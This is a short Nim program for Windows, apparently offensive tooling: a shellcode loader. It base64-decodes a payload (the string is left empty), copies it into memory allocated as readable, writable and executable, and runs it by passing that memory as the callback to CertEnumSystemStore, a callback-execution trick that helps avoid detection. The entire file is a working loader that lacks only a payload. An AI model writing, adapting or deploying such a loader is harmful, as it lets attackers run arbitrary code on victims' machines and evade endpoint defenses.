import base64
import winim
import winim/lean

proc cert_enum_system_store[byte](shellcode: openArray[byte]): void =
  let rPtr = VirtualAlloc(NULL, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
  RtlCopyMemory(rPtr, unsafeAddr shellcode, cast[SIZE_T](shellcode.len))
  CertEnumSystemStore(CERT_SYSTEM_STORE_CURRENT_USER, NULL, NULL, cast[PFN_CERT_ENUM_SYSTEM_STORE](rPtr)) 
  

when isMainModule:
  func toByteSeq*(str: string): seq[byte] {.inline.} =
    @(str.toOpenArrayByte(0, str.high))
 
  let enc = ""
  let shellcode = toByteSeq(decode(enc))
  cert_enum_system_store(shellcode)

